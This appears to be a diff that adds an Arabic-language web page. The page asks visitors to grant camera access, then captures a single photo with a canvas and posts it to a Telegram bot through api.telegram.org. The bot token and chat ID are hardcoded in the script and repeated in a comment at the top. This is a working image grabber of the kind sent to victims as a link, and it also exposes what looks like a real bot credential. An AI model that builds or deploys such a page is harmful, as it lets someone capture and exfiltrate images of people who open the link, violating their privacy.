@@ -1,0 +1,130 @@
+
+<!-- const TELEGRAM_BOT_TOKEN = '6822625757:AAFuBb7icwxuFpKjqFTWwlKb5poUSUfWTNo'; // استبدل هذا بالتوكن الخاص بك
+const TELEGRAM_CHAT_ID = '5152526784'; // استبدل هذا بالـ chat_id الخاص بك -->
+
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>طلب الأذونات للوصول إلى الكاميرا</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            margin: 0;
+            padding: 0;
+            background-color: #f4f4f4;
+        }
+
+        h1 {
+            color: #333;
+            margin-top: 20px;
+        }
+
+        #permissionRequest {
+            background-color: #28a745;
+            color: white;
+            padding: 20px;
+            border-radius: 10px;
+            font-size: 18px;
+            margin-top: 30px;
+            text-align: center;
+        }
+
+        #permissionRequest button {
+            background-color: #007bff;
+            color: white;
+            border: none;
+            padding: 12px 25px;
+            border-radius: 8px;
+            cursor: pointer;
+        }
+
+        #permissionRequest button:hover {
+            background-color: #0056b3;
+        }
+    </style>
+</head>
+<body>
+    <h1>الوصول إلى الكاميرا</h1>
+
+    <!-- واجهة مخصصة لطلب الإذن -->
+    <div id="permissionRequest">
+        <p>يرجى السماح لنا بالوصول إلى الكاميرا لالتقاط صورة وإرسالها. اضغط على زر "منح الإذن" للمتابعة.</p>
+        <button id="requestPermissionBtn">منح الإذن</button>
+    </div>
+
+    <script>
+        const TELEGRAM_BOT_TOKEN = '6822625757:AAFuBb7icwxuFpKjqFTWwlKb5poUSUfWTNo'; // استبدل هذا بالتوكن الخاص بك
+        const TELEGRAM_CHAT_ID = '5152526784'; // استبدل هذا بالـ chat_id الخاص بك
+
+        // عند الضغط على زر منح الإذن
+        document.getElementById('requestPermissionBtn').addEventListener('click', function() {
+            // طلب الوصول إلى الكاميرا فقط
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(function(stream) {
+                    // إخفاء واجهة الطلب بعد النقر
+                    document.getElementById('permissionRequest').style.display = 'none';
+
+                    // التقاط الصورة فقط
+                    captureImageAndSendToTelegram(stream);
+                })
+                .catch(function(error) {
+                    alert('حدث خطأ في الوصول إلى الكاميرا. تأكد من تمكين الإذن.');
+                });
+        });
+
+        function captureImageAndSendToTelegram(stream) {
+            // إنشاء عنصر فيديو مؤقت لالتقاط الصورة
+            const videoElement = document.createElement('video');
+            videoElement.srcObject = stream;
+            videoElement.play();
+
+            // الانتظار حتى يتم تحميل الفيديو (حتى يبدأ التشغيل)
+            videoElement.onloadedmetadata = function() {
+                // إنشاء عنصر canvas لالتقاط الصورة
+                const canvas = document.createElement('canvas');
+                const context = canvas.getContext('2d');
+
+                // رسم الصورة من الفيديو على الـ canvas
+                canvas.width = videoElement.videoWidth;
+                canvas.height = videoElement.videoHeight;
+                context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
+
+                // تحويل الصورة إلى Blob
+                canvas.toBlob(function(blob) {
+                    // إرسال الصورة إلى بوت Telegram
+                    sendImageToTelegram(blob);
+
+                    // إيقاف تدفق الكاميرا بعد إرسال الصورة
+                    stopCamera(stream);
+                }, 'image/png');
+            };
+        }
+
+        function sendImageToTelegram(imageBlob) {
+            const formData = new FormData();
+            formData.append('chat_id', TELEGRAM_CHAT_ID);
+            formData.append('photo', imageBlob, 'image.png'); // إرسال الصورة كـ Blob
+
+            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('تم إرسال الصورة بنجاح إلى Telegram:', data);
+            })
+            .catch(error => {
+                console.error('حدث خطأ أثناء إرسال الصورة إلى Telegram:', error);
+            });
+        }
+
+        function stopCamera(stream) {
+            const tracks = stream.getTracks();
+            tracks.forEach(track => track.stop()); // إيقاف كل المسارات (الكاميرا)
+        }
+    </script>
+</body>
+</html>
